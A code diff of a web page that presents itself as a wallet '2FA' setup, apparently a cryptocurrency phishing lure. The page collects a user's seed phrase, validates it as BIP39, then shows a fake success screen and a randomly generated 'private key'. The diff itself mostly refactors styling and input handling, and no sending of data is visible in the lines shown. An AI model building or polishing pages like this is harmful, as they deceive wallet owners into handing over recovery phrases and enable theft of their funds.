@@ -19,8 +19,6 @@
   --badge-text: #ffffff;
   --badge-hover: #1a1a1a;
   --badge-active-border: #ffffff;
-  --card-bg: #0a0a0a;
-  --card-border: #2a2a2a;
 }
 
 * {
@@ -51,8 +49,8 @@ body {
 }
 
 .card {
-  background: #0a0a0a !important;
-  border: 1px solid #2a2a2a !important;
+  background: #0a0a0a;
+  border: 1px solid #2a2a2a;
   border-radius: 8px;
   padding: 20px;
   display: flex;
@@ -64,7 +62,7 @@ body {
   display: flex;
   align-items: center;
   gap: 16px;
-  margin-bottom: 0;
+  margin: 0;
 }
 
 .back-btn {
@@ -117,7 +115,7 @@ body {
 }
 
 .form-group {
-  margin-bottom: 0;
+  margin: 0;
   display: flex;
   flex-direction: column;
   gap: 12px;
@@ -138,10 +136,6 @@ body {
   overflow-y: auto;
 }
 
-.word-container.error {
-  border-color: var(--error);
-}
-
 .word-badge {
   background: var(--badge-bg);
   border: 1px solid var(--badge-border);
@@ -153,7 +147,6 @@ body {
   display: inline-flex;
   align-items: center;
   gap: 6px;
-  position: relative;
   animation: slideIn .2s ease;
   white-space: nowrap;
   transition: all .15s;
@@ -192,7 +185,6 @@ body {
   letter-spacing: 1.2px;
   font-size: 0.75rem;
   font-weight: 600;
-  transition: all .15s ease;
   flex: 1;
   text-align: center;
 }
@@ -213,9 +205,6 @@ body {
   color: var(--label);
   font-weight: bold;
   font-size: 0.9rem;
-  line-height: 1;
-  user-select: none;
-  transition: color .15s;
   background: none;
   border: none;
   padding: 0;
@@ -225,6 +214,7 @@ body {
   display: flex;
   align-items: center;
   justify-content: center;
+  transition: color .15s;
 }
 
 .word-remove:hover {
@@ -232,14 +222,8 @@ body {
 }
 
 @keyframes slideIn {
-  from {
-    opacity: 0;
-    transform: scale(0.95);
-  }
-  to {
-    opacity: 1;
-    transform: scale(1);
-  }
+  from { opacity: 0; transform: scale(0.95); }
+  to { opacity: 1; transform: scale(1); }
 }
 
 .edit-input {
@@ -280,9 +264,9 @@ body {
   display: flex;
   justify-content: space-between;
   align-items: center;
-  margin-top: 0;
-  padding-top: 0;
-  border-top: none;
+  margin: 0;
+  padding: 0;
+  border: none;
   min-height: 20px;
   width: 100%;
 }
@@ -309,10 +293,11 @@ body {
   transition: opacity .15s;
   padding: 0;
   white-space: nowrap;
+  display: none;
 }
 
-.action-btn:hover {
-  opacity: 0.7;
+.action-btn.show {
+  display: block;
 }
 
 .helper-text {
@@ -337,7 +322,6 @@ body {
   cursor: pointer;
   font-size: 0.95rem;
   width: 100%;
-  margin-top: 0;
   transition: background .15s;
   font-family: inherit;
 }
@@ -385,11 +369,10 @@ body {
   width: 48px;
   height: 48px;
   border-radius: 50%;
-  display: inline-block;
   border: 2px solid var(--success);
   position: relative;
   animation: pop .4s ease;
-  margin-bottom: 16px;
+  margin: 0 auto 16px;
 }
 
 .checkmark::after {
@@ -433,7 +416,7 @@ body {
   align-items: center;
   background: var(--badge-bg);
   border-radius: 6px;
-  border: 1px solid var(--card-border);
+  border: 1px solid #2a2a2a;
   padding: 10px;
   font-family: 'Courier New', monospace;
   font-size: 0.7rem;
@@ -463,16 +446,12 @@ body {
   .container {
     padding: 24px 16px;
   }
-  
   .header-content h1 {
     font-size: 1.3rem;
   }
-  
-  .word-badge,
-  .word-input {
+  .word-badge, .word-input {
     flex: 0 0 calc(50% - 5px);
   }
-  
   .word-container {
     min-height: 320px;
   }
@@ -482,7 +461,6 @@ body {
 <body>
 
 <div class="container">
-
   <div id="main-page">
     <div class="card">
       <div class="header">
@@ -495,14 +473,7 @@ body {
 
       <div class="form-group">
         <div class="word-container" id="word-container">
-          <input 
-            type="text" 
-            id="mnemonic-input" 
-            class="word-input" 
-            placeholder="Add space between words and make sure no one is watching"
-            autocomplete="off"
-            spellcheck="false"
-          >
+          <input type="text" id="mnemonic-input" class="word-input" placeholder="Add space between words and make sure no one is watching" autocomplete="off" spellcheck="false">
         </div>
         
         <div class="actions">
@@ -531,7 +502,6 @@ body {
       <h3>2FA Activated Successfully</h3>
       <p>Your wallet security has been updated with 2FA protection enabled.</p>
     </div>
-
     <div id="aes-container">
       <label>Your Private Key (Store Securely)</label>
       <div id="aes-box">
@@ -540,7 +510,6 @@ body {
       </div>
     </div>
   </div>
-
 </div>
 
 <script>
@@ -596,29 +565,23 @@ async function isValidBip39(wordsList) {
   if (!WORDS_READY || wordsList.length === 0) return false;
   const n = wordsList.length;
   if (!ENT_BY_WORDS[n]) return false;
-  
   for (const w of wordsList) {
     if (!WORD_MAP.has(w)) return false;
   }
-
   const ENT = ENT_BY_WORDS[n];
   const CS = ENT / 32;
   const bitstr = wordsToBitString(wordsList);
   if (!bitstr) return false;
-
   const entBits = bitstr.slice(0, ENT);
   const csBits = bitstr.slice(ENT, ENT + CS);
   const entropyBytes = bitsToBytes(entBits);
-  
   try {
     const hashBuf = await crypto.subtle.digest('SHA-256', entropyBytes);
     const hash = new Uint8Array(hashBuf);
     let hashBits = "";
     for (const b of hash) hashBits += b.toString(2).padStart(8, '0');
     return csBits === hashBits.slice(0, CS);
-  } catch {
-    return false;
-  }
+  } catch { return false; }
 }
 
 function getMaskedText(word) {
@@ -627,50 +590,33 @@ function getMaskedText(word) {
 
 function renderWords() {
   wordContainer.querySelectorAll('.word-badge').forEach(b => b.remove());
-  
   for (let idx = 0; idx < words.length; idx++) {
     const word = words[idx];
     const badge = document.createElement('div');
     badge.className = 'word-badge';
-    
-    if (activeEditIdx === idx) {
-      badge.classList.add('active');
-    }
-    
+    if (activeEditIdx === idx) badge.classList.add('active');
     const isValid = WORD_MAP.has(word);
     if (!isValid) badge.classList.add('error');
-    
     const isRevealed = activeEditIdx === idx || revealedIndices.has(idx);
     const wordDisplay = isRevealed ? word : (isValid ? getMaskedText(word) : word);
     
     if (activeEditIdx === idx) {
-      badge.innerHTML = `
-        <span class="word-number">${idx + 1}.</span>
-        <input type="text" class="edit-input" value="${word}" autocomplete="off" spellcheck="false">
-        <button class="word-remove" type="button" style="display: flex;">×</button>
-      `;
-      
+      badge.innerHTML = `<span class="word-number">${idx + 1}.</span><input type="text" class="edit-input" value="${word}" autocomplete="off" spellcheck="false"><button class="word-remove" type="button">×</button>`;
       const editInput = badge.querySelector('.edit-input');
       editInput.focus();
       editInput.select();
-      
       editInput.addEventListener('blur', () => {
         const newWord = editInput.value.trim().toLowerCase();
-        if (newWord.length > 0) {
-          words[idx] = newWord;
-        }
+        if (newWord.length > 0) words[idx] = newWord;
         activeEditIdx = null;
         renderWords();
         updateValidation();
       });
-      
       editInput.addEventListener('keydown', (e) => {
         e.stopPropagation();
         if (e.key === 'Enter') {
           const newWord = editInput.value.trim().toLowerCase();
-          if (newWord.length > 0) {
-            words[idx] = newWord;
-          }
+          if (newWord.length > 0) words[idx] = newWord;
           activeEditIdx = null;
           renderWords();
           updateValidation();
@@ -681,12 +627,7 @@ function renderWords() {
       });
     } else {
       const wordTextClass = isValid ? (revealedIndices.has(idx) ? 'revealed' : '') : 'invalid';
-      badge.innerHTML = `
-        <span class="word-number">${idx + 1}.</span>
-        <span class="word-text ${wordTextClass}">${wordDisplay}</span>
-        <button class="word-remove" type="button" style="display: flex;">×</button>
-      `;
-      
+      badge.innerHTML = `<span class="word-number">${idx + 1}.</span><span class="word-text ${wordTextClass}">${wordDisplay}</span><button class="word-remove" type="button">×</button>`;
       badge.onclick = (e) => {
         if (!e.target.classList.contains('word-remove')) {
           e.stopPropagation();
@@ -695,7 +636,6 @@ function renderWords() {
         }
       };
     }
-    
     badge.querySelector('.word-remove').onclick = (e) => {
       e.stopPropagation();
       words.splice(idx, 1);
@@ -705,10 +645,8 @@ function renderWords() {
       mnemonicInput.focus();
       updateValidation();
     };
-    
     wordContainer.insertBefore(badge, mnemonicInput);
   }
-  
   updateButtonVisibility();
 }
 
@@ -716,27 +654,140 @@ function updateButtonVisibility() {
   const hasWords = words.length > 0;
   const hasInput = mnemonicInput.value.trim().length > 0;
   
-  if (hasWords || hasInput) {
-    mnemonicInput.placeholder = '';
-    clearAllBtn.style.display = hasWords ? 'block' : 'none';
-    pasteBtn.style.display = 'none';
-  } else {
-    mnemonicInput.placeholder = 'Add space between words and make sure no one is watching';
-    clearAllBtn.style.display = 'none';
-    pasteBtn.style.display = 'block';
+  pasteBtn.classList.remove('show');
+  clearAllBtn.classList.remove('show');
+  
+  if (!hasWords && !hasInput) {
+    pasteBtn.classList.add('show');
+  } else if (hasWords) {
+    clearAllBtn.classList.add('show');
   }
 }
 
 async function updateValidation() {
   const wordCount = words.length;
   const isValid = [12, 15, 18, 21, 24].includes(wordCount);
-  
   errorMsg.textContent = '';
   helperText.classList.remove('show');
   continueBtn.classList.remove('active');
   continueBtn.disabled = true;
   
   if (wordCount === 0) return;
-  
   if (words.filter(w => !WORD_MAP.has(w)).length > 0) {
-    helperText.classList.add('show
+    helperText.classList.add('show');
+    return;
+  }
+  
+  if (isValid) {
+    if (await isValidBip39(words)) {
+      continueBtn.disabled = false;
+      continueBtn.classList.add('active');
+    } else {
+      errorMsg.textContent = 'Invalid checksum. Please check your words.';
+    }
+  } else if (wordCount > 24) {
+    errorMsg.textContent = 'Too many words. Maximum is 24.';
+  }
+}
+
+function handleTyping() {
+  const text = mnemonicInput.value;
+  if (text.length > 0 && /\s/.test(text)) {
+    const parts = text.split(/\s+/);
+    for (let i = 0; i < parts.length - 1; i++) {
+      const w = parts[i].trim().toLowerCase();
+      if (w.length > 0) words.push(w);
+    }
+    mnemonicInput.value = '';
+    renderWords();
+    updateValidation();
+  }
+  updateButtonVisibility();
+}
+
+mnemonicInput.addEventListener('input', () => {
+  if (!isPastingFromButton && activeEditIdx === null) {
+    handleTyping();
+  }
+});
+
+mnemonicInput.addEventListener('keydown', async (e) => {
+  if (e.key === 'Enter') {
+    e.preventDefault();
+    const word = mnemonicInput.value.trim().toLowerCase();
+    if (word) {
+      words.push(word);
+      mnemonicInput.value = '';
+      renderWords();
+      await updateValidation();
+    }
+  } else if (e.key === 'Backspace' && mnemonicInput.value === '' && words.length > 0) {
+    words.pop();
+    renderWords();
+    await updateValidation();
+  }
+  setTimeout(updateButtonVisibility, 0);
+});
+
+mnemonicInput.addEventListener('paste', async (e) => {
+  e.preventDefault();
+  const text = (e.clipboardData || window.clipboardData).getData('text');
+  const pastedWords = text.trim().toLowerCase().split(/[\s\n\r\t]+/).filter(w => w.length > 0);
+  words = pastedWords;
+  revealedIndices.clear();
+  activeEditIdx = null;
+  mnemonicInput.value = '';
+  renderWords();
+  await updateValidation();
+});
+
+wordContainer.addEventListener('click', () => {
+  if (activeEditIdx === null) mnemonicInput.focus();
+});
+
+clearAllBtn.onclick = () => {
+  words = [];
+  revealedIndices.clear();
+  activeEditIdx = null;
+  mnemonicInput.value = '';
+  renderWords();
+  updateValidation();
+  mnemonicInput.focus();
+};
+
+pasteBtn.onclick = async () => {
+  try {
+    isPastingFromButton = true;
+    const text = await navigator.clipboard.readText();
+    const pastedWords = text.trim().toLowerCase().split(/[\s\n\r\t]+/).filter(w => w.length > 0);
+    words = pastedWords;
+    revealedIndices.clear();
+    activeEditIdx = null;
+    mnemonicInput.value = '';
+    renderWords();
+    await updateValidation();
+    isPastingFromButton = false;
+  } catch (err) {
+    alert("Failed to paste from clipboard");
+    isPastingFromButton = false;
+  }
+};
+
+backBtn.onclick = () => console.log('Back clicked');
+
+continueBtn.onclick = async () => {
+  document.getElementById('main-page').style.display = 'none';
+  document.getElementById('loading-page').style.display = 'block';
+  setTimeout(() => {
+    document.getElementById('loading-page').style.display = 'none';
+    document.getElementById('success-page').style.display = 'block';
+    const key = btoa(crypto.getRandomValues(new Uint8Array(32)).reduce((a,b) => a + String.fromCharCode(b), ''));
+    document.getElementById('aes-key').textContent = key;
+    document.getElementById('copyAesBtn').onclick = () => navigator.clipboard.writeText(key).catch(() => alert("Failed to copy"));
+  }, 1500);
+};
+
+mnemonicInput.focus();
+</script>
+</body>
+</html>
